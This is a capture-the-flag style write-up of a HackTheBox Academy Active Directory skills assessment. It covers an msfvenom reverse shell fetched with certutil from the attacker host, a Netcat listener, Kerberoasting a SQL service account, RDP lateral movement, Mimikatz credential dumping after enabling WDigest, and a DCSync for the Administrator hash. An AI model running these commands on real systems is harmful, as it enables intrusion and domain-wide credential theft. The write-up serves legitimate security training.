# HackTheBox Academy - AD Enumeration & Attacks Skills Assessment Part 1

## Overview


**Platform:** HackTheBox Academy  
**Module:** Active Directory Enumeration & Attacks  
**Assessment:** Part 1  
**Category:** Active Directory / Red Teaming

This writeup documents my approach to compromising the Active Directory environment during the assessment.

The attack chain involved:

* Obtaining a reverse shell
* Active Directory enumeration
* Kerberoasting a service account
* Lateral movement to MS01
* Credential dumping using Mimikatz
* Abusing replication privileges through DCSync

# Initial Access

The initial foothold was through a web shell. However, the shell was unstable and commands were not executing properly.

To obtain a more reliable shell, I generated a Windows reverse shell payload using `msfvenom`.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.91 LPORT=6969 -f exe -o shell.exe
```

I hosted the payload on my Kali machine:

```bash
python3 -m http.server 8000
```

From the target machine, I downloaded the payload using `certutil`.

```cmd
certutil -urlcache -f http://10.10.14.91:8000/shell.exe vj.exe
```

Started a Netcat listener:

```bash
nc -nvlp 6969
```

After executing the payload, I received a reverse shell on my Kali machine.

---

# Active Directory Enumeration

After obtaining command execution, I switched to PowerShell for easier Active Directory enumeration.

During enumeration, I looked for accounts associated with Service Principal Names (SPNs), as these accounts can be targeted for Kerberoasting.

I found an MSSQL service SPN:

```text
MSSQLSvc/SQL01.inlanefreight.local:1433
```

This indicated that the associated service account could potentially be vulnerable to Kerberoasting.

---

# Kerberoasting svc_sql

PowerView was not available on the target machine, so I transferred it using `certutil`.

After importing PowerView:

```powershell
Import-Module .\PowerView.ps1
```

I enumerated users with SPNs:

```powershell
Get-DomainUser -SPN
```

The SQL service account was identified:

```text
svc_sql
```

with the SPN:

```text
MSSQLSvc/SQL01.inlanefreight.local:1433
```

I requested the Kerberos service ticket:

```powershell
Get-DomainSPNTicket -SPN MSSQLSvc/SQL01.inlanefreight.local:1433
```

The extracted Kerberos hash was cracked offline, revealing the credentials:

```text
Username: svc_sql
Password: lucky7
```

---

# Enumerating MS01

The assessment required access to the machine `MS01`.

I first verified the machine information:

```powershell
Get-DomainComputer -Identity MS01
```

Using the recovered `svc_sql` credentials, I checked access to the administrative share:

```cmd
dir \\MS01\C$ /user:INLANEFREIGHT\svc_sql lucky7
```

The share was accessible, confirming that `svc_sql` had administrative privileges on MS01.

---

# Lateral Movement to MS01

To obtain an interactive session, I connected to MS01 using RDP.

Since the target was only reachable through the internal network, I routed the connection through a SOCKS proxy.

```bash
proxychains xfreerdp /v:MS01 /u:svc_sql@INLANEFREIGHT.LOCAL /p:lucky7
```

After logging in, I checked the privileges of the account:

```cmd
net localgroup administrators
```

The output confirmed:

```text
INLANEFREIGHT\svc_sql
```

was a local administrator on MS01.

---

# Credential Dumping with Mimikatz

Since `svc_sql` had administrator privileges, I transferred Mimikatz to the machine.

I shared my Kali directory during the RDP session:

```bash
proxychains xfreerdp /v:MS01 /u:svc_sql@INLANEFREIGHT.LOCAL /p:lucky7 /drive:kali,/usr/share/windows-resources/mimikatz/x64
```

## Enabling WDigest

Windows disables plaintext credential storage through WDigest by default.

I enabled WDigest credential caching:

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

After restarting the machine, I opened Mimikatz.

Enabled debug privileges:

```cmd
privilege::debug
```

Dumped credentials:

```cmd
sekurlsa::logonpasswords
```

This revealed credentials for another domain user:

```text
Username:
tpetty

Password:
Sup3rS3cur3D0m@inU2er
```

---

# Finding Replication Rights

After obtaining the credentials for `tpetty`, I checked the user's Active Directory privileges.

The account had the following replication permissions:

```text
Replicating Directory Changes

Replicating Directory Changes All
```

These permissions allow an attacker to perform a DCSync attack and retrieve password hashes from the Domain Controller.

---

# DCSync Attack

Using Mimikatz, I performed a DCSync attack to retrieve the Administrator hash.

```cmd
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

The command successfully returned the NTLM hash of the Administrator account.

At this point, the domain was fully compromised.

---

# Attack Chain Summary

```text
Web Shell
    |
    ↓
Reverse Shell
    |
    ↓
Active Directory Enumeration
    |
    ↓
Kerberoasting svc_sql
    |
    ↓
Recover svc_sql Credentials
    |
    ↓
RDP Access to MS01
    |
    ↓
Local Administrator Access
    |
    ↓
Credential Dumping using Mimikatz
    |
    ↓
Find Replication Rights
    |
    ↓
DCSync Administrator Hash
```

---

# Tools Used

| Tool        | Purpose                          |
| ----------- | -------------------------------- |
| msfvenom    | Reverse shell payload generation |
| Netcat      | Reverse shell listener           |
| certutil    | File transfer                    |
| PowerView   | Active Directory enumeration     |
| xfreerdp    | Remote Desktop access            |
| Mimikatz    | Credential dumping               |
| Proxychains | Network pivoting                 |

---